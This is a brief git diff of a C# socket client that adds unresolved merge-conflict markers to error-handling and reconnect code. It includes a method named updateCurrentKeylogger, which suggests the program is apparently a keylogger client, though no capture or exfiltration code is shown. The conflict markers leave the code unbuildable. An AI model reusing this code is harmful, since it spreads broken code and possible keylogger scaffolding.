@@ -164,7 +164,11 @@ namespace ClientSide
              
             catch (SocketException ex)
             {
+<<<<<<< HEAD
                 ShowErrorDialog("ReceiveCallback " + ex.Message);
+=======
+                ShowErrorDialog("ReceiveCallback - RECONNECT \n" + ex.Message);
+>>>>>>> 0374d47b78fa1e09394efa66121e89e6e3b6e12c
                 reConnect();
             }
             catch (ObjectDisposedException ex)
@@ -466,7 +470,11 @@ namespace ClientSide
 
         public void reConnect()
         {
+<<<<<<< HEAD
             try
+=======
+            try  
+>>>>>>> 0374d47b78fa1e09394efa66121e89e6e3b6e12c
             {
 
                 // Create new socket 
@@ -488,7 +496,11 @@ namespace ClientSide
             {
                ShowErrorDialog("reConnect send ObjectDisposedException \r\n" + ex.Message);
             }
+<<<<<<< HEAD
         }
+=======
+        } 
+>>>>>>> 0374d47b78fa1e09394efa66121e89e6e3b6e12c
 
         public static void updateCurrentKeylogger(string word)
         {           
